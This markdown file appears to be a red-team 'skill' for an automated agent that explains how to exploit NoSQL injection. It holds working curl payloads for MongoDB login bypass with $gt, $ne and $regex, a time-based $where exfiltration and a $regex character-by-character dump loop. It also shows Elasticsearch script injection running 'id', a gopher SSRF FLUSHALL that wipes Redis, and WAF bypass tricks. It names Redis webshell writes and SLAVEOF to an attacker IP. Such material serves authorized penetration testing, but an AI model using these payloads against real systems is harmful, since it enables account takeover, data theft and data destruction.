---
name: NoSQL Injection
description: Exploit NoSQL databases (MongoDB, CouchDB, Redis, Elasticsearch) via operator injection, $where JS injection, auth bypass, and blind data exfiltration to bypass auth and dump collections.
tags: [nosqli, mongodb, injection, auth-bypass, redis, exploitation]
recommended_tools: [http_request, http_repeater, http_intruder, curl, python3, nuclei_scan, ffuf_scan, jq]
vuln_classes: []
domain: web
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [redteam/hunt-nosqli/SKILL.md]}
---

# NoSQL Injection

NoSQL injection abuses the fact that many document stores (MongoDB, CouchDB) and key-value/search engines
(Redis, Elasticsearch) accept structured input — objects, arrays, operators — where the application expects a
scalar string. When user input reaches a query without being coerced to a string, an attacker can inject query
operators (`$gt`, `$ne`, `$regex`, `$where`, `$in`) to alter the query's logic. The two highest-impact outcomes
are authentication bypass and blind exfiltration of an entire collection.

CWE-943 (Improper Neutralization of Special Elements in Data Query Logic). Related: CWE-89 (SQL Injection family).

## Crown Jewel Targets

NoSQL injection is most valuable when it bypasses authentication (Critical) or leaks the entire user
collection (High). Highest-value chains:

- **MongoDB auth bypass** — `{"username": {"$gt": ""}, "password": {"$gt": ""}}` logs in as the first user in
  the collection (usually the admin/test account) → Critical.
- **`$where` JS injection** — if `$where` is enabled: blind time-based injection → per-character data exfil.
- **Redis command injection** — via SSRF or direct TCP: `SLAVEOF` attacker-IP or `CONFIG SET` dir/dbfilename →
  config write → webshell / cron RCE.
- **Elasticsearch injection** — `_search` endpoint with Groovy/MVEL script injection (pre-5.0) → RCE.

## Attack Surface Signals

### URL & Parameter Patterns
```
/api/users/login        POST with JSON body {username, password}
/api/search?q=
/api/find?filter=
/api/query?where=
Any endpoint accepting a JSON body with username/password or a filter object
```

### Stack Fingerprints

| Signal | Vector |
|--------|--------|
| MongoDB error strings in response (`MongoError`, `CastError`, `E11000`) | Operator injection |
| `mongoose` / `monk` / `mongodb` in JS bundles | ODM query patterns |
| `X-Powered-By: Express` | Node.js + MongoDB is the common stack |
| CouchDB `/_utils` UI exposed (Futon/Fauxton) | Admin surface + Mango query injection |
| Redis port 6379 open (often only via SSRF) | `CONFIG SET` / `SLAVEOF` |
| Elasticsearch `:9200` open | Script injection |

## Gate 0 — Deterministic Proof First

Do not report NoSQLi on a hunch. Establish a differential before claiming impact:

1. **Baseline** — send the endpoint a normal request with a value guaranteed to fail (bad password / non-matching filter). Record status, length, timing.
2. **Operator probe** — replace the scalar with an always-true operator (`{"$ne": null}` / `{"$gt": ""}`). If the response flips from failure to success/authenticated, the parameter is injectable.
3. **Type-confusion sanity** — send a string that contains the operator characters literally (`"$ne"`). If that behaves like the baseline but the *object* form flips behavior, you have real operator injection (not a string coincidence).
4. **Blind confirm** — for `$where`, confirm with a consistent time delay (>4s repeatable, and a 0s control) before trusting boolean/time exfil.

Only after a clean differential do you escalate to dumping or auth-bypass claims.

## Methodology

### Phase 1 — Auth Bypass (MongoDB operator injection, JSON body)
```bash
# $gt "" beats any stored string → logs in as the first matching user (usually admin)
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# $regex wildcard — match any username
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# $ne bypass — target a known username, defeat the password check
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrong"}}'

# $in array — try a list of privileged usernames in one request
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": "x"}}'
```

Equivalent via `http_request` / `http_repeater`: set method POST, `Content-Type: application/json`, and the
JSON body above. Use `http_intruder` to fuzz the username `$in` list against a wordlist of privileged accounts.

### Phase 2 — URL / Form Parameter Injection (Express/PHP array notation)
When the endpoint parses query strings or urlencoded form bodies into nested objects, operators can be
injected without a JSON body — this bypasses code paths that only reject JSON objects.
```bash
# Query string array notation → parsed into {username:{$gt:""}, password:{$gt:""}}
curl "https://$TARGET/api/users?username[\$gt]=&password[\$gt]="
curl "https://$TARGET/api/search?q[\$regex]=.*&q[\$options]=i"

# urlencoded POST form data
curl -X POST "https://$TARGET/api/login" \
  --data "username[\$gt]=&password[\$gt]="
```

### Phase 3 — `$where` Blind Injection (time-based)
`$where` runs arbitrary JavaScript inside the MongoDB query context. It is disabled by default in modern
deployments but still appears in legacy apps and where `javascriptEnabled` is on.
```bash
# Detection: force a ~5s busy loop; a 5s+ response confirms $where executes
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){var d=new Date();while(new Date()-d<5000){}; return true;}"}}'

# Blind exfil: sleep only when the predicate is true (username starts with 'a'?)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"}}'
```

### Phase 4 — Blind Data Dump via `$regex`
Boolean-based exfil: `$regex` anchored per character reveals field contents through response-length or
result-count differences. Faster than time-based when a boolean oracle exists.
```bash
# Enumerate the leading char of usernames by observing response size deltas
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  RESP=$(curl -s -X POST https://$TARGET/api/users \
    -H "Content-Type: application/json" \
    -d "{\"username\": {\"\$regex\": \"^$c\"}}")
  echo "$c: $(echo "$RESP" | wc -c)"
done
```
Extend the anchor (`^$c$next`) character-by-character to recover full values; scriptable in `python3` with a
binary/alphabet search for password-hash and reset-token fields.

### Phase 5 — CouchDB / Mango & Elasticsearch
```bash
# CouchDB Mango: $gt bypass in a selector, or _all_docs to dump when auth is weak
curl -s -X POST https://$TARGET/db/_find \
  -H "Content-Type: application/json" \
  -d '{"selector": {"password": {"$gt": null}}}'

# Elasticsearch (pre-5.0) Groovy script injection via _search
curl -s "https://$TARGET:9200/_search" -H "Content-Type: application/json" \
  -d '{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")"}}}'
```

### Phase 6 — Redis via SSRF
Redis speaks a line protocol, so an SSRF that reaches `127.0.0.1:6379` (via `gopher://`) can issue commands.
```bash
# FLUSHALL / probe internal Redis via gopher through an SSRF sink
curl "https://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"

# CONFIG SET dir/dbfilename to write a webshell into the web root, or
# SLAVEOF attacker-ip:port for out-of-band data exfil / module-load RCE
```
See the SSRF and RCE skills for the full gopher-packet construction and RESP encoding.

### Phase 7 — Automation
```bash
# NoSQLmap for MongoDB auth-bypass and extraction
pip3 install nosqlmap
nosqlmap -u "https://$TARGET/api/login" --attack 1   # auth bypass
nosqlmap -u "https://$TARGET/api/login" --attack 2   # data extraction

# nuclei templates for known NoSQLi/exposed-DB signatures
nuclei_scan -u https://$TARGET -tags nosqli,mongodb,couchdb,elasticsearch,redis
```

## WAF / Parser Bypasses

| Defense | Bypass |
|---------|--------|
| `JSON.parse` rejects nested objects | Use query/form array notation: `password[$ne]=x` |
| Server strips a leading `$` from keys | Unicode/dotted operator forms, or `mongo-sanitize` gaps — nest deeper: `{"a":{"b":{"$gt":""}}}` |
| Blocks top-level operator keys | Bury the operator one level below where the sanitizer checks |
| Content-Type allowlist (JSON only) | Switch to `application/x-www-form-urlencoded` with array notation |
| Input coerced to string | Send an array `["admin"]` — some drivers apply `$in` semantics to arrays |

## Chaining

| NoSQLi finding | Chain to | Impact |
|---------------|----------|--------|
| Auth bypass | Admin panel access | Full admin control → further privesc |
| User enum via `$regex` | Credential stuffing / targeted ATO | Mass account takeover |
| `$where` enabled | Arbitrary JS in DB process | Blind data exfil or DoS |
| Redis reachable via SSRF | `CONFIG SET` / `SLAVEOF` | Webshell or OOB exfil → RCE |
| Recovered password-reset token via `$regex` | Account takeover | ATO without credentials |

## Validation & Severity

- **Auth bypass** — logged in without valid credentials and received a valid session token/cookie. Confirm the authenticated identity (whoami/profile endpoint).
- **Data dump** — returned users/documents the current principal should not be able to read; capture a sample.
- **Blind injection** — confirmed via a consistent time delay (>4s, repeatable, with a 0s control) or a stable boolean oracle.

Severity guidance:
- Auth bypass as admin / first-user: **Critical**.
- User-collection dump or password-hash/token exfil: **High**.
- Blind injection with no useful exfil (DoS-only or non-sensitive field): **Medium**.
- A bypass that logs in only as a *random* non-privileged user you cannot target: downgrade toward **Medium**.

## Related Techniques

- **SQL injection** — test both on the same parameter; a param may accept SQL `' OR 1=1--` and NoSQL `{"$gt":""}`.
- **Auth bypass** — NoSQLi login bypass (`{"$ne":""}`) is an auth-bypass primitive, not a data read.
- **SSRF** — Redis-via-SSRF is the canonical NoSQLi-to-RCE path.
- **Command injection / RCE** — `$where` JS and Elasticsearch script injection can reach OS command execution.
